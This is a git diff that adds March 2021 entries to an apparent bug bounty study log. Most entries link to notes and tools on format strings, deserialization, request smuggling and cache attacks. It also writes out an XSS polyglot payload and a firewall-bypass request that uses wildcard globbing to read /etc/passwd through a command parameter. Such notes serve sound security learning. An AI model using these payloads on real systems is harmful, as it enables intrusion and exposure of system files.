@@ -51,3 +51,51 @@
 # 📅 08-Mar-2021
 ## m4ll0k Bug Bounty Tools
 - https://github.com/m4ll0k/Bug-Bounty-Toolz
+
+# 📅 09-Mar-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 67
+- [Format String Vulnerabilities](https://twitter.com/harshbothra_/status/1368914428377272320?s=20)
+
+# 📅 10-Mar-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 68
+- [Mobile Application Dynamic Analysis](https://twitter.com/harshbothra_/status/1369303054777016324?s=20)
+
+## XSS via HTTP Request Smuggling
+- https://infosecwriteups.com/exploiting-http-request-smuggling-te-cl-xss-to-website-takeover-c0fc634a661b
+
+# 📅 11-Mar-2021
+## Slides from talks
+- https://github.com/1ndianl33t/All-in-one_BugBounty_PDF_bundles/blob/master/README.md?s=09
+
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 69
+- [ Insecure Deserialization](https://twitter.com/harshbothra_/status/1369654854612787202?s=20)
+
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 70
+- [Web Cache Entanglement](https://twitter.com/harshbothra_/status/1369732836266184704?s=20)
+
+## Desirialization Attacks
+- https://github.com/kojenov/serial
+- https://youtu.be/Y0QxwRyqlh8
+
+## The Best XSS Polyglot! Police cars revolving lightPolice cars revolving light
+```js
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+
+## Bypass Firewalls
+```http
+GET /?cc=cat+/etc/passwd
+
+403 Forbidden
+
+GET /?cc=/???/??t+/???/??ss??
+
+200
+root:x:0:0:root...
+
+Done bypass firewall
+```
+
+# 📅 12-Mar-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 71
+- [OWASP Amass](https://twitter.com/harshbothra_/status/1370103728473182212?s=20)
